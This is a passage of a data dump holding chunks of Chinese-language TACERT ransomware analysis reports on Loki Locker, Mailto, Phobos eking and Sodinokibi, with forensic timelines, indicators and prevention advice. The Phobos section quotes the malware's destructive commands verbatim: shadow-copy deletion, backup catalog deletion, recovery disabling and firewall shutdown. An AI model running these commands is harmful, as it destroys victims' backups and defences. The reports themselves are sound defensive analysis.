發生錯誤、無法執行程式。透過cvtres.exe 來修復執行階 段錯誤。 (3.2) 呼叫cmd.exe。 (3.2.1)執行vssadmin.exe 刪除所有指定磁碟區的陰影複製(在執行 時,命令不會顯示訊息)。 (3.2.2)執行wbadmin.exe 刪除一或多個系統狀態備份。 (3.2.3)執行WMIC.exe 來",
        "Page_Num": "4,5,6"
    },
    "340": {
        "File_Name": "個案分析-勒索病毒Loki Locker分析報告.pdf",
        "content": "刪除影子副本。 (3.2.4)執行wbadmin.exe 刪除本機電腦上的備份類別目錄。 (3.2.5)執行bcdedit.exe 不顯示Windows 不正常關機之自動修復訊息。 (3.2.6)執行bcdedit.exe 不顯示不正常斷電時的復原畫面。 (3.2.7)執行netsh.exe 關閉\"當前\"使用的防火牆。 (3.2.8)執行netsh.exe 停用防火牆。 (3.3)執行5 個mshta.exe 來執行info.hta 腳本,以開啟勒索通知信的畫 面。 7. 從開機啟動程式內容發現winlogon.exe 與wvtymcow.bat 在開機後會自 動啟動,而且有建立一個新的Loki 排程來執行winlogon.exe。在登錄 檔新增的Michael Gillespie 啟動設定,該名稱是一名勒索軟體研究員的 名字,而該研究員分析勒索軟體,以便為勒索軟體受害者建立免費解 密器。 他還是ID Ransomware 服務的建立者,該服務可用於識別受害 者感染了哪些勒索軟體。在此Loki locker 以該研究員名字命名啟動設 定之用意耐人尋味。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 8. 在啟動資料夾中發現新產生的wvtymcow.bat,其作用是使用系統管理員 權限停用任務管理器。wvtymcow.bat 在主機上出現在兩個地方:使用者 appdata 內與windows\\system32 內。 9. 重新開機時,會出現Blue Screen。之後在系統登入時出現Encrypted by Loki locker 的資訊。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 10. 開機完成後winlogon.exe 啟動,主機再次執行加密作業,之後在 C:\\ProgramData 產生Cpriv2.Loki。 11. 原開機前存在的腳本info.hta,在重新開機後會被加密。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 12. 在C:\\ProgramData 發現3 個偽",
        "Page_Num": "6,7,8,9"
    },
    "341": {
        "File_Name": "個案分析-勒索病毒Loki Locker分析報告.pdf",
        "content": "裝成系統檔的隱藏程式5t3maorh.exe、 sowsg5qe.exe 與winlogon.exe。經virustotal 檢測它們惡意比例為25/67、 25/66 與55/68。這3 個檔案被ESET-NOD32 防毒軟體判定為「A Variant of MSIL/Filecoder.LokiLocker.C」,為勒索軟體LokiLocker 的變種。其 中winlogon.exe 為本案病毒樣本的副本,而其餘兩個檔案為執行過程中 產生於主機內的惡意程式。  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 三、攻擊行為示意圖 1.透過新建之測試主機入侵受害主機。 2.執行157342.exe 開始加密作業。 3.連線荷蘭IP。 4.建立登入後自動執行之新排程Loki,讓排程Loki 以系統管理者權限執行 winlogon.exe,並且自動執行wvtymcow.bat。 5.修復Compiler 所造成的執行階段錯誤。 6.再次執行157342.exe。 7.修復Compiler 所造成的執行階段錯誤。 8.執行vssadmin.exe 刪除所有指定磁碟區的陰影複製。 9.執行wbadmin.exe 刪除一或多個系統狀態備份。 10.執行WMIC.exe 刪除影子副本。  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 11.執行wbadmin.exe 刪除本機電腦上的備份類別目錄。 12.執行bcdedit.exe 不顯示Windows 不正常關機的自動修復訊息,以及不顯示不 正常斷電時的復原畫面。 13.執行netsh.exe 關閉「當前」使用的防火牆與停用防火牆。 14.執行5 個mshta.exe 來執行info.hta 腳本。 15.每次開機會啟動winlogon.exe 來執行加密作業。 (註: winlogon.exe 之hash 值與157342.exe 相同。) 四、 總結與建議 1. 本案所感染的勒索病毒Loki Locker 是該病毒的新變種,在檢測時該病毒 在ID Ransomware 之勒索軟體識別網站上,",
        "Page_Num": "9,10,11"
    },
    "342": {
        "File_Name": "個案分析-勒索病毒Loki Locker分析報告.pdf",
        "content": "還無法使用Ransom Note 與被 加密的檔案來判別出感染它。 2. 它在完成加密過程後,會透過提供三種不同的Ransom note 來確保受害者 必定收到通知。一條訊息將顯示為新的桌面背景圖片,另一條訊息將放置 在名為「Restore-My-Files.txt」的文件檔中,而第三組訊息說明將執行 info.hta 顯示在彈出視窗中。此手法與一般勒索病毒只使用一種Ransom note 不同。 3. 它會將本機磁碟機更名為Locked by Loki,而且不會加密網路磁碟機內的 檔案。此點與一般的勒索病毒特性也不同。 4. 它執行後刪除備份、影子副本、備份類別目錄,不顯示不正常關機或不正 常斷電時會彈跳出的復原訊息,以及禁用防火牆功能等動作,完整地呈現 一般惡意程式對受害主機會使用的攻擊手法。 5. 該勒索病毒在重新開機後,會自動執行winlogon.exe 來再次加密主機內的 檔案。故在處理受害主機時,需先刪除winlogon.exe 才可中止惡意程式執 行。  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 6. 本案源起於該單位新建立之測試主機被駭客入侵後,進而在內網中攻擊受 害主機,最後導致主機感染Loki Locker。因此,建議在內網中可採用依 用途或需求分類之切割網段方式,以確保各網段的安全。對於執行重要業 務之伺服器,建議勿與測試用主機放於相同網段中。 7. 對於勒索病毒Loki Locker 的預防,建議平時做好定期備份,以免如本案 發生時,無法利用備份還原各校網站版型,只能使用公版版型重設網站。 ",
        "Page_Num": "11,12"
    },
    "343": {
        "File_Name": "個案分析-勒索病毒Mailto分析報告_10902.pdf",
        "content": "勒索病毒Mailto 分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2020 年02 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、 事件簡介 1. 2019 年9 月左右發現了一個新變種的勒索病毒,該勒索病毒基於附加到加密 文件的擴展名被命名為Mailto (又名NetWalker)。 2. 瞄準企業網路的Mailto 病毒在2020 年1 月31 日目標式攻擊澳洲貨運與物流 公司Toll Group 的公司網路,加密連接至公司網路的所有Windows 設備,高 達1000 台主機被感染,導致該公司關閉許多IT 系統。 3. 2020 年2 月初澳洲Australian Signals Directorate 的Australian Cyber Security Centre (ACSC)發布此病毒的警報通知。 4. 為了瞭解勒索病毒Mailto 的攻擊行為與對受害者的危害程度,本中心對病毒 樣本58e923ff.exe 進行檢測。 二、事件檢測 1. 首先,使用一台32 位元Windows 7 的虛擬主機,執行病毒樣本58e923ff.exe (MD5: 73de5babf166f28dc81d6c2faa369379 )。執行後,58e923ff.exe 在原地消 失。它會呼叫explorer.exe 來執行vssadmin.exe 刪除影子副本,也會開啟勒 索通知信90670-Readme.txt。 2. 檢視主機的系統效能,發現explorer.exe(2372)執行時CPU 衝高將近80%。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 3. 加密檔案時,Mailto 會延伸檔案名稱格式為「.mailto[mail address].檔案加密 延伸id」,例如:.mailto[kkeessnnkkaa@cock.li].90670。除C:\\windows 與 C:\\Program Files 兩資料夾內檔案沒有被加密外,其餘檔案皆被加密。 4. 該勒索病毒會產生一個有「受害者id-Readme.txt」檔案名稱的勒索通知信, 內含受害主機被加密的資訊、",
        "Page_Num": "1,2,3"
    },
    "344": {
        "File_Name": "個案分析-勒索病毒Mailto分析報告_10902.pdf",
        "content": "加密檔案延伸代碼(.90670)與兩個可以獲得付款 金額與說明的電子郵件信箱。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 5. 當58e923ff.exe 首次執行,會在登錄檔「電腦 \\HKEY_CURRENT_USER\\Software\\90670739」內建立一個登錄機碼(registry key)。 6. 經ID Ransomware(https://id-ransomware.malwarehunterteam.com)判定 58e923ff.exe 為Mailto (Netwalker) 勒索病毒。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 7. 該病毒經Virustotal 檢測,其惡意比例為58/70,而且多家防毒公司以Mailto 或Netwalker 命名它。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 三、事件攻擊行為示意圖 1. 駭客使用密碼噴霧攻擊與散播網路釣魚郵件方式散播Mailto 病毒。 2. 使用者開啟網路釣魚郵件感染Mailto 病毒,進行檔案加密作業。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 3. Mailto 病毒呼叫explorer.exe 來執行vssadmin.exe,以刪除影子副本。 4. 加密後,呼叫notepad.exe 來開啟勒索通知信。 四、總結與建議 1. Mailto 勒索病毒的主要攻擊目標以企業網路為主。 2. 它喜歡針對在任何停機時間就無法正常運作的行業進行攻擊,因為會提高 受害者支付贖金的機率。 3. 醫療保健組織、政府單位、工業控制系統以及運輸公司都是該勒索病毒的 攻擊目標。 4. Mailto 病毒會在執行後在原地消失、加密檔案與刪除影子副本。 5. 關於Mailto 病毒攻擊事件的預防措施,有下列幾點建議。 (1) 更新防毒軟體與病毒碼,並且定期掃毒。 (2) 修補程式或作業系統的漏洞。 (3) 定期備份資料。 (4) 掃描電子郵件內容。 (5) 網路切割: 將網路劃分為較小的部分,以分離和",
        "Page_Num": "3,4,5,6,7"
    },
    "345": {
        "File_Name": "個案分析-勒索病毒Mailto分析報告_10902.pdf",
        "content": "隔離特定主機和服務之間的通信。 適當的分段和隔離將限制勒索病毒感染在網路上的散播程度。 五、相關報導 1. Advisory 2020-003: Mailto ransomware incidents https://www.cyber.gov.au/threats/advisory-2020-003-mailto-ransomware-incidents 2. Toll Group hit by \"new variant\" of Mailto ransomware https://www.itnews.com.au/news/toll-group-hit-by-new-variant-of-mailto-ransomwar e-537537 ",
        "Page_Num": "7"
    },
    "346": {
        "File_Name": "個案分析-勒索病毒Phobos之變種eking分析報告.pdf",
        "content": "TLP :WHITE 勒索病毒Phobos 之變種 eking 分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2020 年11 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、 事件簡介 1. 2020/10/20 A 國小發生4 台主機感染勒索病毒事件,而2020/10/24 B 高中發 生6 台PC、4 台伺服器與4 台NAS 感染勒索病毒事件。經TACERT 檢測發 現這兩間學校皆是感染勒索病毒Phobos 的新變種病毒eking。 2. Phobos 的變種病毒eking 可透過開啟釣魚郵件的附件Word 檔啟動巨集方式 下載到受感染主機內執行。 3. B 高中管理者對所有管理的伺服器皆使用同一組帳號與密碼登入系統,而且 該校有使用掛載NAS 資料夾為網路磁碟機的情形,這些狀況增加了勒索病毒 的影響範圍。 4. 為了解該勒索病毒Phobos 對於受害主機進行何種攻擊行為,TACERT 取得病 毒樣本後進行分析。 二、事件檢測 1. 首先,使用一台掛載網路碟機的Win 7 32 位元主機,並且執行病毒樣本 6e9c9b72.exe (MD5: be13334c44f2e0331a6d1d6460ff9359)。 2. 病毒6e9c9b72.exe 執行後發現下列現象: (1) 原先執行中的Office 系列軟體都被關閉。 (2) 出現光碟機還有檔案等候燒錄的訊息,可能是因為原先隱藏保護的系統檔  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 案desktop.ini 變成.eking 檔後顯示出來的關係。 (3) 出現Windows 防火牆已關閉的訊息。 (4) 出現4 個encrypted 視窗於桌面。 3. 檢視主機內檔案被加密的情形,發現除了C:\\windows 系統資料夾外,所有檔 案(包含程式檔案)都被6e9c9b72.exe 加密。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 4.",
        "Page_Num": "1,2,3,4"
    },
    "347": {
        "File_Name": "個案分析-勒索病毒Phobos之變種eking分析報告.pdf",
        "content": "在C:\\與D:\\內有皆有兩個檔案info.txt 與info.hta,而且被加密的檔案副檔名 皆為eking。這些被加密的檔案會從原檔案名稱中延伸出「id[駭客給受害主機 的id].[駭客聯絡的E-mail].eking」等檔名。 5. 檢視info.txt 內容,發現駭客告訴受害者你的所有檔案已被加密,想解密檔案 需寄信至wiruxa@airmail.cc的信箱。如果24小時內沒有得到回應,則寄E-mail 至yongloun@tutanota.com 或 anygrishevich@yandex.ru。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 6. 點選info.hta 會出現encrypted 視窗。該視窗除與info.txt 的內容有重複外,還 告訴受害者如何購買比特幣與保證免費協助將5 個檔案解密,也警告受害者 不要做哪些行為。 7. 檢視主機的背景程式內容,發現6e9c9b72.exe 執行後會陸續執行3 個cmd.exe 與4 個mshta.exe 來進行除了加密檔案外的一些動作。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (1) cmd.exe 執行後會呼叫vssadmin.exe、WMIC.exe、bcdedit.exe 與 wbadmin.exe 來執行下表所列行為。 指令 行為 vssadmin delete shadows /all /quiet wmic shadowcopy delete 刪除影子副本 bcdedit /set {default} bootstatuspolicy ignoreallfailures bcdedit /set {default} recoveryenabled no 取消「Windows 不 正常關機顯示自 動修復」的功能 wbadmin delete catalog -quiet 刪除備份目錄 (2) cmd.exe 執行後呼叫netsh.exe 來執行下表所列行為。 指令 行為 netsh advfirewall set currentprofile state off 關閉當前使用的防火牆 netsh firewall set opmode mode=disable 關閉防火牆 (3) 執行mshta.exe 開啟桌面與C:\\、D:",
        "Page_Num": "4,5,6"
    },
    "348": {
        "File_Name": "個案分析-勒索病毒Phobos之變種eking分析報告.pdf",
        "content": "\\內的4 個info.hta 腳本檔案。 (4) 再次執行cmd.exe 呼叫vssadmin.exe、WMIC.exe、bcdedit.exe 與 wbadmin.exe。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 8. 除網路磁碟機的資料夾內檔案被加密外,後來新增於資料夾內的檔案也會馬 上被加密。推測6e9c9b72.exe 加密所有檔案後仍然在背景程式中執行著。 9. 查看運行中的程式會發現有兩個6e9C9b72.exe 的程序執行著。 10. 檢視每次開機登入後的程式執行設定,發現有修改登錄檔,而且除了 6e9c9b72.exe 原來所在資料夾外,在主機內另有3 個資料夾內存有該程式副 本。這4 個勒索病毒的程序會在重新開機後自動執行。 11. 將info.txt 與一個被加密的eking 檔案上傳至 ID Ransomware 勒索病毒識別網 站(https://id-ransomware.malwarehunterteam.com),經檢測判定為Phobos,而 且該勒索病毒目前尚未有解密器。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 12. 6e9c9b72.exe 經 Virustotal 檢測其惡意比例高達58/72,而且仍有14 家防毒 軟體公司的防毒軟體無法檢測出它的存在。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 三、攻擊行為示意圖  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 1. 駭客散播含有惡意巨集的Word 檔。 2. 使用者開啟惡意的Word 檔後執行6e9c9b72.exe 來進行檔案加密作業。 3. 6e9c9b72.exe 執行後會複製自己至主機內的「%APPDATA%」資料夾和「啟 動」資料夾中。 4. 修改登錄檔與設定6e9c9b72.exe 在主機開機後啟動。 5. 關閉執行中的",
        "Page_Num": "6,7,8,9,10"
    },
    "349": {
        "File_Name": "個案分析-勒索病毒Phobos之變種eking分析報告.pdf",
        "content": "程式(如:Office 系列程式)。 6. 執行cmd.exe (1)執行vssadmin.exe 與WMIC.exe 來刪除影子副本。 (2)執行bcdedit.exe 來取消Windows 不正常關機顯示自動修復的功能。 (3)執行wbadmin.exe 來刪除備份目錄。 7. 執行cmd.exe (1)執行netsh.exe 來關閉防火牆。 8. 執行mshta.exe 開啟存放在桌面、C:\\與D:\\內的4 個info.hta 腳本。 9. 再次執行cmd.exe (1) 執行vssadmin.exe 與WMIC.exe 來刪除影子副本。 (2) 執行bcdedit.exe 來取消Windows 不正常關機顯示自動修復的功能。 (3) 執行wbadmin.exe 來刪除備份目錄。 10. 6e9c9b72.exe 持續在背景程式中執行著。 四、總結與建議 1. 勒索病毒Phobos 是2019 年初被發現的,之後持續有變種產生,而且經常 更改延伸的副檔名與發展新的攻擊方法。 2. 早期該病毒會透過RDP 連線方式(3389port)散播,近期的攻擊手法改為透 過帶有惡意巨集的Word 文件檔來散播Phobos 的eking 變種。 3. 它感染受害主機後會複製自己本身於主機內(在「%APPDATA%」和「啟  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 動」資料夾中),故受害主機重新啟動時則該勒索病毒也會啟動。 4. 該eking 變種程式執行後會關閉防火牆、刪除影子副本、取消Windows 不正常關機顯示自動修復的功能、刪除備份目錄與開啟勒索通知信的腳本 檔案info.hta 等行為。 5. 該病毒在加密之前會將執行中的程式(例如:Office系列程式)關閉後才開始 加密。 6. 它會產生兩種格式的勒索通知信.txt 與.hta。在完成加密的過程後會彈 出.hta 的視窗,此時Phobos 惡意程式仍然在背景中執行著,等著加密新 ",
        "Page_Num": "10,11"
    },
    "350": {
        "File_Name": "個案分析-勒索病毒Phobos之變種eking分析報告.pdf",
        "content": "建立的文件。 7. Phobos 勒索病毒非常有攻擊性,可以重複感染。為了防止重複感染,在 處理時建議先將網路線拔除。若開機,需登入後先將該病毒所建立的複本 中止執行,並且從受害主機上移除。 8. 對於此勒索病毒的預防除了平時做好資料備份外,建議不要隨意開啟不明 來源的檔案。 ",
        "Page_Num": "11"
    },
    "351": {
        "File_Name": "個案分析-勒索病毒Sodinokibi攻擊事件分析報告_10810.pdf",
        "content": "勒索病毒Sodinokibi (REvil) 攻擊事件分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2019 年10 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、 事件簡介 1. 2019 年9 月中旬某校發生同一區域網路內多台主機感染病毒事件,其中有三 台主機連到某台主機的共用資料夾,詳細網路架構如下圖所示。 2. 該資安事件各主機感染病毒情形如下表所示,其中除了主計系統主機的共用 資料夾被加密外,主計系統主機內其他資料夾都沒有被加密。 主機簡稱 IP 主機用途 系統 網路芳鄰分享 (網路磁碟機) 檔案被加密的 範圍 39 主機 203.X.X.39 英聽廣播 伺服器 windows server 2008 --- 整個主機 12 主機 203.X.X.12 主計系統 windows server 2008 主程式資料開啟 網路芳鄰分享資 料夾main 除main 資料夾 內檔案被加密 外,無其他檔 案被加密。 42 主機 203.X.X.42 實習材料 管理系統 windows server 2003 連線12 主機的網 路磁碟機 整個主機 9 主機 203.X.X.9 成績查閱 系統 windows server 2008 連線12 主機的網 路磁碟機 整個主機  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 主機簡稱 IP 主機用途 系統 網路芳鄰分享 (網路磁碟機) 檔案被加密的 範圍 17 主機 203.X.X.17 辦公室行 政用電腦 windows 7 連線12 主機的網 路磁碟機 整個主機 31 主機 203.X.X.31 電腦監測 系統 windows 7 --- 整個主機 3. 部分受害主機在事件發生後即被緊急處理,無法採證,但為了解駭客在本事 件之攻擊行為與危害程度,本中心對學校所能提供的多台受害主機log 檔與 電力監測系統主機進行log 分析與鑑識作業。 二、事件檢測 1. 首先,透過分析各受害主機的事件檢視紀錄,發現這些主機",
        "Page_Num": "1,2,3"
    },
    "352": {
        "File_Name": "個案分析-勒索病毒Sodinokibi攻擊事件分析報告_10810.pdf",
        "content": "大都有來自 IP:203.X.X.17 的遠端桌面登入(RDP)或網路登入的連線紀錄,而連線時間點 皆介於2019/9/12 下午10:20 至下午11:13 之間。 IP 事件檢視紀錄 203.X.X.39 2019/9/12 PM 10:55、PM 11:13 IP:203.X.X.17 RDP 登入 203.X.X.12 2019/9/12 PM10:55 IP:203.X.X.42 匿名登入, 2019/9/12 PM 11:11 IP:203.X.X.31 網路登入 2019/9/12 PM11:14 IP:203.X.X.9 網路登入 2019/9/12 PM 10:20 IP:203.X.X.17 網路登入 203.X.X.31 2019/9/12 PM 10:20 IP:203.X.X.17 網路登入 2019/9/12 PM 10:51、PM11:03 IP:203.X.X.17 RDP 登入 2019/9/12 PM 11:18 IBMX3550M2 主機 網路登入 其中從12主機的連線紀錄得知,31主機曾在2019/9/12下午11:11以帳戶ETB user 網路登入12 主機。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 在39 主機的連線紀錄也發現,17 主機在2019/9/12 下午10:55 與下午11:13 曾 經以帳戶ETB User 登入39 主機,這些連線所使用的登入帳戶皆為ETB User。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 2. 檢視31 主機的使用者帳戶發現有一個非管理者所建立的帳戶adm,而從事件 檢視紀錄得知該帳戶adm 於2019/9/12 下午10:58 被建立。 在C:\\使用者資料夾內發現一個在2019/9/12 下午10:51 建立的ETB User 資料 夾,但在主機登入畫面與使用者帳戶管理內無此帳戶資訊,而前述所提到帳戶  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team adm,則在檢測時以帳戶adm 登入主機後才建立adm 資料夾,可以得知駭客雖 然建立adm 帳戶,但是卻沒有",
        "Page_Num": "3,4,5,6"
    },
    "353": {
        "File_Name": "個案分析-勒索病毒Sodinokibi攻擊事件分析報告_10810.pdf",
        "content": "使用它。 從事件檢視紀錄中得知,帳戶ETB User 是在 2016/4/27 下午4:13 被建立。 3. 查看31 主機的連線紀錄,發現9/12 下午10:20、下午10:51 與下午11:03 IP:203.X.X.17 曾以帳戶ETB User 從遠端桌面連線或以網路方式成功登入31 主機。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 在2019/9/12 下午11:18 有一個IBMX3550M2 主機以帳戶ETB User 網路連線登 入31 主機。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 4. 透過lastactivityview 檢視31 主機操作紀錄,發現在9/12 下午10:51 帳戶ETB User 登入後,在下午10:53 執行Windows Installer,之後在9/12 下午11:03 再次登入主機執行Windows Installer,在9/17 上午1:25 安裝ScreenConnect Client,至9/17 下午4:12 帳戶ETB User 登出。 5. 從31 主機操作紀錄發現在2016/4/27 下午4:12 安裝過電腦備份還原軟體 EaseUS Todo Backup (第6 版),目前該軟體最新版為第12.9 版,經查詢網路 資訊,發現該軟體在第5.8 版曾存在一個硬編碼(hardcoded)的管理密碼,該密 碼可視為潛在的後門,為該軟體的一大漏洞,而本主機所安裝的第6 版可能 也存在此漏洞。 以Net User 指令查看主機的使用者帳戶發現帳戶ETB User 仍然使用中,檢 視ETB User 的帳戶資訊,發現該帳戶提供軟體EaseUS Todo Backup 的Central Management Console(中央管理控制台)使用。從ETB User 帳戶資訊得知,該 帳戶在2016/4/27 下午4:13 建立帳戶並設定預設密碼後,再無變更密碼,而 且該帳戶具有系統管理者權限。此外,該帳戶上次登入時間2019/9/12 下午  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 11:18 為本資安事件發生時間。",
        "Page_Num": "6,7,8,9"
    },
    "354": {
        "File_Name": "個案分析-勒索病毒Sodinokibi攻擊事件分析報告_10810.pdf",
        "content": "6. 在帳戶ETB User 的桌面,發現一個在2019/9/12 下午9:41 建立的Windows Firewall.exe 執行檔,其檔名易被視為防火牆之設定檔,而該檔案在2019/9/12 下午11:08 被執行過,其檔案建立時間下午9:41 比ETB User 資料夾建立時間 同日下午10:51 還要早,推測該檔案可能是從主機其他地方移入。  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team Windows Firewall.exe 經Virustotal 檢測,其惡意比例為45/67,有多家防毒軟體 以Ransom.Sodinokibi 命名它。 7. 從31 主機的程式和功能內容,發現在2019/9/17 曾安裝過 ScreenConnectClient(efb8cf813b6eaefc)。  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 在主機的事件檢視紀錄內發現2019/9/12 下午10:53 曾安裝過 ScreenConnectClient(efb8cf813b6eaefc),而且該程式會在開機後自動啟動。 在C:\\Program Files內ScreenConnectClient(efb8cf813b6eaefc)資料夾的建立日期為 2019/9/17 上午1:25,推測駭客將原先2019/9/12 安裝的程式ScreenConnectClient 移除重裝過。  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 8. 在C:\\Program Files\\ ScreenConnectClient(efb8cf813b6eaefc)資料夾內有兩個執 行檔ScreenConnect.ClientService.exe 與ScreenConnect.WindowsClient.exe,而 從主機背景程式運作情形得知,ScreenConnect.ClientService.exe 執行後會呼 叫ScreenConnect.WindowsClient.exe 來執行。檢視 ScreenConnect.ClientService.exe 屬性內容,發現該程式會在重新開機後自動 執行。從執行的Command line 內容得知,會以Guest 身分存取網址 https://",
        "Page_Num": "9,10,11,12"
    },
    "355": {
        "File_Name": "個案分析-勒索病毒Sodinokibi攻擊事件分析報告_10810.pdf",
        "content": "instance-d6o30s-replay.screenconnect.com,而其傳輸內容為加密內容。 ScreenConnect.ClientService.exe 經Virustotal 檢測其惡意比例為2/69,表示大多數 防毒軟體無法偵測出它的存在。 檢視ScreenConnect.WindowsClient.exe 屬性內容,發現Command line 內容為設定 執行角色,而且該程式在主機開機後不會自動執行,但是會因為  12 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team ScreenConnect.ClientService.exe 的呼叫而啟動。 在C:\\windows\\temp 內發現setup.msi,執行set.msi 後發現該程式會安裝 ScreenConnectClient(efb8cf813b6eaefc)。 從事件檢視紀錄得知,2019/9/17 上午1:25 所安裝的 ScreenConnectClient(efb8cf813b6eaefc)是執行setup.msi 後所產生。  13 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 9. 從事件檢視紀錄發現駭客在2019/9/12 下午10:51 以帳戶ETB User 登入主機 後,在下午10:52 執行WindowsMail 的備份,並產生備份檔edb00001.log。 10. 查看31 主機檔案被加密情形,發現除C:\\windows 外,檔案都被加密,加密 過的資料夾會有3599d-readme.txt,而有些有3599d-readme.txt.mbjzslr4 與 mbjzslr4-readme.txt.3599d 兩個檔案。 所有被加密過的檔案會在檔名後延伸出3599d 的副檔名,以「*.3599d」查詢 所有主機內檔案,發現第一檔案被加密的時間點在2019/9/12 下午11:08,推 測此為駭客執行勒索軟體的時間。  14 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 檢視3599d-readme.txt 內容,發現此為勒索通知信,主要告訴受害者所有被加 密的檔案都會延伸3599d",
        "Page_Num": "12,13,14,15"
    },
    "356": {
        "File_Name": "個案分析-勒索病毒Sodinokibi攻擊事件分析報告_10810.pdf",
        "content": "的副檔名,也告訴受害者需透過洋蔥瀏覽器連結信 中所提供的網址來取得付款資訊,而且在信件最後有提供一組加密的key 給 使用者連上網址後使用。 開啟599d-readme.txt.mbjzslr4 與mbjzslr4-readme.txt.3599d 兩個檔案,發現內 容為亂碼,無法辨識。  15 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 11. 將3599d-readme.txt 與被加密的檔案上傳至ID Ransomware 勒索病毒辦別網 站(https://id-ransomware.malwarehunterteam.com),經檢測判定為Sodinokibi 勒索軟體,因此推測在ETB User 桌面的Windows Firewall.exe 為主機中毒來 源,而駭客可能是以帳戶ETB User 登入主機後,在主機上直接執行Windows Firewall.exe,最後導致整個主機中毒。  16 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 12. 查看31 主機的Windows 防火牆設定,發現為關閉狀態,此種設定將降低主 機的資安防護能力。 13. 檢視31 主機的防火牆輸入規則設定,發現主機有開啟駭客常會攻擊的 3389port 與445port。 14. 檢視31 主機的防毒軟體Windows Defender 內容,發現最近一次掃描為 2019/9/17 上午2:22,但是卻無法發現惡意軟體windows firewall.exe 存在於主 機內。  17 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 查看主機Windows update 更新系統狀態,發現該主機從未進行過系統更新。 從Windows update 設定內容,發現該主機設定為「永遠不檢查更新」,此將 導致系統漏洞無法修補,降低駭客駭入主機的困難性。 檢視更新記錄得知,該主機有定期更新Windows Defender,但是無法防禦 Sodinokibi 勒索軟體的攻擊。  18 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 15. 從事件檢視紀錄發現2019/9/12 下午11:04 駭客曾經利用C",
        "Page_Num": "15,16,17,18,19"
    },
    "357": {
        "File_Name": "個案分析-勒索病毒Sodinokibi攻擊事件分析報告_10810.pdf",
        "content": ":\\Windows\\Installer 資料夾內的20ace.msi,來安裝ESET NOD32 Antivirus 防毒軟體,但檢測31 主機時,在C:\\Windows 內已找不到Installer 資料夾與20ace.msi。 16. 由事件檢視紀錄可得知,在2019/9/12 下午11:08 駭客執行8 次PowerShell, 此時間為Sodinokibi 勒索軟體加密主機檔案的時間,推測這些PowerShell 的 執行或許與Sodinokibi 勒索軟體有關。  19 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 17. 實際執行程式windows firewall.exe,來查看其執行後會產生何種攻擊行為, 而執行結果如下所示。 (1)在程式windows firewall.exe 執行後,主機桌面會變成藍色,並且有提醒語「All of your files are encrypted!Find cr89jg2-readme.txt and follow instuctions」呈現於桌 面,告訴受害者所有檔案已被加密,要去找到cr89jg2-readme.txt,並且遵從檔案 內指令。一段小段時間後,藍色桌面與提醒語在檔案加密完成後便會消失不見。 (2)查看cr89jg2-readme.txt 內容,發現與31 主機的勒索通知信3599d-readme.txt 相同。  20 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 利用洋蔥瀏覽器開啟駭客所提供的連結網頁,將勒索通知信內的一段亂碼Key 貼上,並且輸入延伸副檔名後送出,即可看到駭客所要求的付款資訊。 在付款資訊的網頁中,駭客告訴受害者解密器的價錢,而且7 天後才付款則會價 錢加倍,也告訴受害者如何付款,以及提供受害者上傳一個圖檔來測試解密器是 否有效的機會。  21 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (3) 在程式windows firewall.exe 執行後會呼叫powershell.exe 來執行一段加密過 的亂碼命令,此呼叫powershell.exe 的行為與31 主機事件檢視紀錄中出現的8 次powershell 紀錄",
        "Page_Num": "19,20,21,22"
    },
    "358": {
        "File_Name": "個案分析-勒索病毒Sodinokibi攻擊事件分析報告_10810.pdf",
